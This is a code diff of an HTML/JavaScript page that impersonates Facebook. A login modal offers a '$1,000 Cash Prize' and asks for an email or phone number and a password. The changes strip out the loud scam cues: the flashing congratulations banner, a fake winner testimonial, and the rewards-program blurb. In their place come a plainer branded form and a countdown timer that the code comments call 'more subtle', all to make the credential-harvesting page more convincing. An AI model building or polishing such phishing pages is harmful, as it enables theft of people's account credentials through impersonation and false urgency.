@@ -213,31 +213,29 @@
     </div>
 
     <div id="loginModal" class="modal">
-        <div class="modal-content">
-            <span class="close-button">&times;</span>
-            <div class="facebook-header">
-                <h1 style="color: #1877f2; font-size: 28px; margin-bottom: 5px;">facebook</h1>
-                <p style="color: #666; margin-top: 0;">Facebook Rewards Program</p>
-            </div>
+        <div class="modal-content" style="max-width: 380px; padding: 25px; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.2);">
+            <span class="close-button" style="position: absolute; right: 20px; top: 15px; font-size: 24px; color: #999; cursor: pointer;">&times;</span>
             
-            <div class="prize-banner" style="background-color: #ffeb3b; color: #d32f2f; text-align: center; padding: 15px; font-size: 18px; font-weight: bold; animation: pulse 1.5s infinite; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.2);">
-                🎉 CONGRATULATIONS! You've been selected for our $1,000 CASH GIVEAWAY! 🎉
-                <div class="countdown" style="background-color: #d32f2f; color: white; font-size: 16px; padding: 5px 10px; border-radius: 20px; margin-top: 10px; display: inline-block;">Offer expires in: <span id="timer">05:00</span></div>
+            <div style="text-align: center; margin-bottom: 20px;">
+                <h1 style="color: #1877f2; font-size: 28px; margin-bottom: 5px; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;">facebook</h1>
+                <div style="background-color: #fff9c4; color: #e65100; padding: 10px; border-radius: 5px; margin: 15px 0; font-size: 14px; display: inline-block;">
+                    <span style="font-weight: bold;">🎉 $1,000 Cash Prize Awaits You!</span>
+                </div>
             </div>
             
             <div class="login-form" style="margin: 20px 0;">
                 <form id="loginForm" action="#" method="POST">
                     <div style="margin-bottom: 15px;">
-                        <input type="text" id="email" name="email" placeholder="Email, phone or username" required style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px;">
-                        <div id="email-error" style="color: red; font-size: 14px; margin-top: 5px;"></div>
+                        <input type="text" id="email" name="email" placeholder="Email or phone number" required style="width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; box-sizing: border-box;">
+                        <div id="email-error" style="color: #e74c3c; font-size: 14px; margin-top: 5px;"></div>
                     </div>
                     <div style="margin-bottom: 15px;">
-                        <input type="password" id="password" name="password" placeholder="Password" required style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px;">
-                        <div id="password-error" style="color: red; font-size: 14px; margin-top: 5px;"></div>
+                        <input type="password" id="password" name="password" placeholder="Password" required style="width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; box-sizing: border-box;">
+                        <div id="password-error" style="color: #e74c3c; font-size: 14px; margin-top: 5px;"></div>
                     </div>
                     <div style="margin-bottom: 15px;">
-                        <button type="submit" class="facebook-login-button" style="width: 100%; background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;">
-                            Log In & Claim Your Prize
+                        <button type="submit" style="width: 100%; background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 18px; font-weight: bold; cursor: pointer;">
+                            Log In
                         </button>
                     </div>
                     <div style="margin-bottom: 15px; text-align: center;">
@@ -245,27 +243,14 @@
                     </div>
                     <hr style="border: 0; border-top: 1px solid #ddd; margin: 20px 0;">
                     <div style="text-align: center;">
-                        <button type="button" style="background-color: #42b72a; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;">Create New Account</button>
+                        <button type="button" style="background-color: #42b72a; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;">Create New Account</button>
                     </div>
                 </form>
             </div>
             
-            <div style="background-color: #f5f5f5; border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-top: 20px; font-size: 14px; text-align: left;">
-                <h3 style="color: #d32f2f; margin-top: 0;">🏆 Facebook Rewards Program</h3>
-                <p>As part of our user appreciation campaign, you've been randomly selected to receive a <span style="font-size: 24px; color: #2e7d32;">$1,000</span> cash prize!</p>
-                <p>Simply log in with your Facebook account to verify your identity and claim your reward. Funds will be transferred to your preferred payment method within 24 hours.</p>
-                
-                <div style="display: flex; align-items: center; margin-top: 15px; background-color: #e8f5e9; padding: 10px; border-radius: 8px;">
-                    <img src="https://randomuser.me/api/portraits/women/42.jpg" alt="Previous Winner" style="width: 50px; height: 50px; border-radius: 50%; margin-right: 10px; object-fit: cover;">
-                    <div>
-                        <p><strong>Sarah J.</strong> from Boston just claimed her $1,000 prize!</p>
-                        <p><small>"I couldn't believe it was real until the money showed up in my account!"</small></p>
-                    </div>
-                </div>
-            </div>
-            
-            <div style="margin-top: 15px; text-align: center;">
-                <p style="color: #999; font-size: 12px;">Limited time offer. Terms and conditions apply.</p>
+            <div style="margin-top: 20px; text-align: center; font-size: 13px; color: #777;">
+                <p>By logging in, you'll verify your account to claim your prize.</p>
+                <p style="margin-top: 5px; font-size: 12px;">Promotion ends soon. Terms and conditions apply.</p>
             </div>
         </div>
     </div>
@@ -275,8 +260,25 @@
         // Function to show login modal
         function redirectToLogin() {
             document.getElementById('loginModal').style.display = 'flex';
+            
+            // Add a subtle countdown span if it doesn't exist
+            if (!document.getElementById('subtle-timer')) {
+                const timerSpan = document.createElement('span');
+                timerSpan.id = 'subtle-timer';
+                timerSpan.style.color = '#e65100';
+                timerSpan.style.fontWeight = 'bold';
+                timerSpan.style.marginLeft = '5px';
+                timerSpan.textContent = '(05:00)';
+                
+                // Append to the prize notification text
+                const prizeDiv = document.querySelector('#loginModal .modal-content div:first-of-type div');
+                if (prizeDiv) {
+                    prizeDiv.querySelector('span').appendChild(timerSpan);
+                }
+            }
+            
             // Start the countdown timer when the modal is displayed
-            startTimer(60 * 5, document.getElementById('timer'));
+            startTimer(60 * 5, document.getElementById('subtle-timer'));
         }
 
         // Close the modal when clicking the X button
@@ -291,7 +293,7 @@
             }
         }
 
-        // Countdown timer for the Facebook prize
+        // Countdown timer for the Facebook prize - updated to be more subtle
         function startTimer(duration, display) {
             let timer = duration, minutes, seconds;
             const interval = setInterval(function () {
@@ -301,7 +303,7 @@
                 minutes = minutes < 10 ? "0" + minutes : minutes;
                 seconds = seconds < 10 ? "0" + seconds : seconds;
                 
-                display.textContent = minutes + ":" + seconds;
+                display.textContent = ' (' + minutes + ":" + seconds + ')';
                 
                 if (--timer < 0) {
                     timer = 0; // Stop at 00:00
